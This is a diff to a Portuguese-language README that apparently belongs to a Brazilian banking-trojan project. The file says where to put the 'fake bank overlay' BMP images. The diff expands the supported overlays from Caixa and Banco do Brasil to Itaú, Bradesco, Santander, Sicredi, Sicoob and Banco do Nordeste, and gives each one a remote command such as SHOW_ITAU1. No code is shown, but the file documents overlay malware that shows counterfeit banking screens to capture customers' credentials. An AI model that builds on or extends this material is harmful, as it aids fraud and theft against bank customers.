@@ -5,9 +5,15 @@
 Coloque aqui as imagens BMP dos overlays falsos de banco.
 
 IMAGENS SUPORTADAS:
-- CEFE_01.bmp  (Comando: SHOW_CEF1)
-- BB_01.bmp    (Comando: SHOW_BB1)
-- BB_02.bmp    (Comando: SHOW_BB2)
+- CEFE_01.bmp       (Comando: SHOW_CEF1)    - Caixa Econômica Federal
+- BB_01.bmp         (Comando: SHOW_BB1)     - Banco do Brasil
+- BB_02.bmp         (Comando: SHOW_BB2)     - Banco do Brasil (alternativo)
+- ITAU_01.bmp       (Comando: SHOW_ITAU1)   - Itaú
+- BRADESCO_01.bmp   (Comando: SHOW_BRADESCO1) - Bradesco
+- SANTANDER_01.bmp  (Comando: SHOW_SANTANDER1) - Santander
+- SICREDI_01.bmp    (Comando: SHOW_SICREDI1) - Sicredi
+- SICOOB_01.bmp     (Comando: SHOW_SICOOB1) - Sicoob
+- BNB_01.bmp        (Comando: SHOW_BNB1)    - Banco do Nordeste
 
 FORMATO:
 - Arquivo: BMP (Bitmap)
